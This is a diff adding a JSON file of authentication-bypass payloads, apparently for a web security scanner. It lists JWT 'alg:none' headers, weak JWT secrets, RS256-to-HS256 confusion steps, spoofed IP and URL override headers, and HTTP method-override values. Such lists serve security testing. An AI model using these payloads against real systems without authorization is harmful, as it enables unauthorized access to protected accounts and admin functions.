@@ -1,0 +1,62 @@
+{
+  "category": "auth_bypass",
+  "contexts": {
+    "jwt_none": {
+      "description": "JWT algorithm confusion attacks using 'none' algorithm",
+      "payloads": [
+        {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:none (base64: {\"alg\":\"none\",\"typ\":\"JWT\"})", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:None (capital N)", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:NONE (uppercase)", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0", "description": "JWT header with alg:nOnE (mixed case)", "waf_bypass": false}
+      ]
+    },
+    "jwt_weak_key": {
+      "description": "JWT signed with known weak/common secrets for brute-force testing",
+      "payloads": [
+        {"payload": "secret", "description": "Common weak JWT secret", "waf_bypass": false},
+        {"payload": "password", "description": "Common weak JWT secret", "waf_bypass": false},
+        {"payload": "123456", "description": "Common numeric weak secret", "waf_bypass": false},
+        {"payload": "changeme", "description": "Default application secret", "waf_bypass": false},
+        {"payload": "your-256-bit-secret", "description": "JWT documentation example secret", "waf_bypass": false},
+        {"payload": "secretkey", "description": "Common default secret", "waf_bypass": false},
+        {"payload": "jwt_secret", "description": "Descriptive weak secret", "waf_bypass": false},
+        {"payload": "HS256", "description": "Algorithm name used as secret", "waf_bypass": false},
+        {"payload": "", "description": "Empty string as JWT secret", "waf_bypass": false}
+      ]
+    },
+    "jwt_confusion": {
+      "description": "JWT algorithm confusion attacks (RS256 to HS256)",
+      "payloads": [
+        {"payload": "Modify alg from RS256 to HS256, sign with server's RSA public key as HMAC secret", "description": "RS256->HS256 confusion: obtain public key, re-sign with it as HS256 HMAC secret", "waf_bypass": false},
+        {"payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "description": "HS256 header to use in RS256->HS256 attack (base64: {\"alg\":\"HS256\",\"typ\":\"JWT\"})", "waf_bypass": false},
+        {"payload": "Obtain public key from /jwks.json or /.well-known/jwks.json, use as HS256 secret", "description": "Fetch public key from JWKS endpoint and use as HMAC secret in HS256 confusion", "waf_bypass": false}
+      ]
+    },
+    "header_bypass": {
+      "description": "HTTP header injection for IP-based access control bypass",
+      "payloads": [
+        {"payload": "X-Forwarded-For: 127.0.0.1", "description": "Spoof source IP to localhost via X-Forwarded-For", "waf_bypass": false},
+        {"payload": "X-Forwarded-For: 192.168.1.1", "description": "Spoof source IP to internal network address", "waf_bypass": false},
+        {"payload": "X-Real-IP: 127.0.0.1", "description": "Spoof IP via X-Real-IP header", "waf_bypass": false},
+        {"payload": "X-Original-URL: /admin", "description": "Override URL path via X-Original-URL (supported by some reverse proxies)", "waf_bypass": false},
+        {"payload": "X-Rewrite-URL: /admin", "description": "Override URL path via X-Rewrite-URL", "waf_bypass": false},
+        {"payload": "X-Custom-IP-Authorization: 127.0.0.1", "description": "Custom IP authorization header seen in some apps", "waf_bypass": false},
+        {"payload": "X-Forwarded-Host: localhost", "description": "Host header spoofing via X-Forwarded-Host", "waf_bypass": false},
+        {"payload": "X-Host: localhost", "description": "Alternative host override header", "waf_bypass": false},
+        {"payload": "X-ProxyUser-Ip: 127.0.0.1", "description": "Proxy user IP header bypass", "waf_bypass": false}
+      ]
+    },
+    "method_override": {
+      "description": "HTTP method override techniques to bypass method-based access controls",
+      "payloads": [
+        {"payload": "X-HTTP-Method-Override: DELETE", "description": "Override HTTP method to DELETE via header", "waf_bypass": false},
+        {"payload": "X-HTTP-Method-Override: PUT", "description": "Override HTTP method to PUT via header", "waf_bypass": false},
+        {"payload": "X-Method-Override: DELETE", "description": "Alternative method override header", "waf_bypass": false},
+        {"payload": "X-Method-Override: PATCH", "description": "Override to PATCH via X-Method-Override", "waf_bypass": false},
+        {"payload": "_method=DELETE", "description": "POST body _method parameter for method override (Rails, Laravel)", "waf_bypass": false},
+        {"payload": "_method=PUT", "description": "PUT method via _method POST parameter", "waf_bypass": false},
+        {"payload": "?_method=DELETE", "description": "Query string _method for method override", "waf_bypass": false}
+      ]
+    }
+  }
+}
